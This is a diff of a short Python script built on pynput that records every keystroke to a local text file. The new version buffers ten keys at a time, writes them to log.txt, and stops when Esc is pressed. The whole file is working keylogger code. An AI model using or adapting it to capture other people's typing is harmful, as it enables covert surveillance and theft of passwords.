@@ -1,20 +1,31 @@
-from pynput import keyboard
+from pynput.keyboard import Key, Listener
 
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:    
-            print("Error getting the char")
+count = 0
+keys = []
 
-if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
 
-    
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
 
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
+def on_release(key):
+    if key == Key.esc:
+        return False
 
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
